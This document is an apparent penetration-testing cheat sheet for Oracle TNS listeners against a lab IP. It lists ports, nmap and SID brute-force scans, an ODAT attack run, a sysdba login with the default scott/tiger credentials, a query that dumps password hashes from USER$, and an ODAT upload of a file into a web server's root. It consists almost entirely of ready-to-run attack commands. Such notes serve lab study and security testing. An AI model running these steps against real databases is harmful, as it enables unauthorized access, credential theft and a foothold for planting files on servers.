# Oracle TNS

## Port

| NUMBER | DESCRIPTION |
|---|---|
| 1521 | Oracle database default listener, in future releases official port 2483 (TCP/IP) and 2484 (TCP/IP with SSL) |
| 2483 | Oracle database listening for insecure client connections, replaces port 1521 |
| 2484 | Oracle database listening for SSL client connections |

## Nmap

```sh
my@attack:~$ sudo nmap 10.129.205.19 -p 1521 -sV -sC
```

## Brute Forcing System Identifiers

```sh
my@attack:~$ sudo nmap 10.129.205.19 -p 1521 -sV -sC --script oracle-sid-brute
```

```output title="Output" hl_lines="8"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-07 01:59 +03
Nmap scan report for 10.129.205.19
Host is up (0.30s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute:
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 522.80 seconds
```

## ODAT

```sh
my@attack:~$ python3 odat.py all -s 10.129.205.19
```

## SQLPlus Installation

### Download Files

```sh
my@attack:~$ wget -q 'https://download.oracle.com/otn_software/linux/instantclient/2360000/instantclient-basic-linux.x64-23.6.0.24.10.zip'
my@attack:~$ wget -q 'https://download.oracle.com/otn_software/linux/instantclient/2360000/instantclient-sqlplus-linux.x64-23.6.0.24.10.zip'
```

### Unzip Downloaded Files

```sh
my@attack:~$ sudo mkdir -p /opt/oracle
my@attack:~$ sudo unzip -d /opt/oracle instantclient-basic-linux.x64-23.6.0.24.10.zip
my@attack:~$ sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-23.6.0.24.10.zip
```

### Update RC File

```sh
my@attack:~$ echo 'export LD_LIBRARY_PATH=/opt/oracle/instantclient_23_6:$LD_LIBRARY_PATH' >> ~/.bashrc
my@attack:~$ echo 'export PATH=$LD_LIBRARY_PATH:$PATH' >> ~/.bashrc
my@attack:~$ source ~/.bashrc
```

## SQLPlus

### Database Administrator Login

```sh
my@attack:~$ sqlplus 'scott'/'tiger'@10.129.205.19/XE as sysdba
```

### Show Tables

```sql
SQL> SELECT TABLE_NAME FROM ALL_TABLES;
```

### User Privileges

```sql
SQL> SELECT * FROM USER_ROLE_PRIVS;
```

### Extract Password Hashes

```sql
SQL> SELECT NAME,PASSWORD FROM USER$;
```

### File Upload

```sh
my@attack:~$ python3 odat.py utlfile -s 10.129.205.19 -d 'XE' -U 'scott' -P 'tiger' --sysdba --putFile 'C:\inetpub\wwwroot' proof.txt /tmp/proof.txt
```
